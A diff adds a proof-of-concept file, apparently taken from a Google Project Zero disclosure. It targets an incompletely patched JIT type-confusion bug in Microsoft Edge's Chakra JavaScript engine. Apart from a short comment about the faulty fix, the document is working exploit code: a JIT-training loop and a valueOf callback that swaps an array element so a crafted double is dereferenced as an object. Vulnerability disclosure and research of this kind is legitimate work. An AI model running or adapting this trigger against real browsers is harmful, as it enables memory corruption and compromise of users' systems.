@@ -1,0 +1,38 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1316
+
+Coincidentally, Microsoft released the patch for the  issue 1290  the day after I reported it. But it seems they fixed it incorrectly again.
+
+This time, "func(a, b, i);" is replaced with "func(a, b, {});".
+
+PoC:
+-->
+
+'use strict';
+
+function func(a, b, c) {
+    a[0] = 1.2;
+    b[0] = c;
+    a[1] = 2.2;
+    a[0] = 2.3023e-320;
+}
+
+function main() {
+    let a = [1.1, 2.2];
+    let b = new Uint32Array(100);
+
+    for (let i = 0; i < 0x1000; i++)
+        func(a, b, {});  // <<---------- REPLACED
+
+    func(a, b, {valueOf: () => {
+        a[0] = {};
+
+        return 0;
+    }});
+
+    a[0].toString();
+}
+
+main();
+
+// Tested on Microsoft Edge 40.15063.0.0(Insider Preview).
